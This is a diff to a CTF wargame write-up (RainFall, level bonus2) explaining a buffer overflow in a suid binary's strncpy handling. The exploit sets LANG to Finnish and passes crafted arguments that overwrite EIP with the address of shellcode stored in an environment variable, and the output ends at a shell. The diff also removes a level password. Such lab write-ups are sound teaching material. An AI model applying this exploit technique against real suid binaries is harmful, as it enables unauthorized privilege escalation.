@@ -1,6 +1,6 @@
-Once we are logged as bonus2/579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+Once we are logged as bonus2
 
-We are presented with a suid binary named bonus2.
+We are presented with a suid binary.
 
 After analysing the binary it seems that it check for env variable and compare with memcpy to check
 For language to use (fi or nl or eng for default) to greet the user
@@ -29,7 +29,7 @@ int main(int argc, char *argv[])
 
 Then we will reproduce a buffer overflow in strncpy with this command to overwrite the eip with address of env SHELLCODE that
 we got.
-
+bonus2@RainFall:~$ export LANG="fi"
 bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xb4\xf8\xff\xbf"')
 Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
 $ whoami
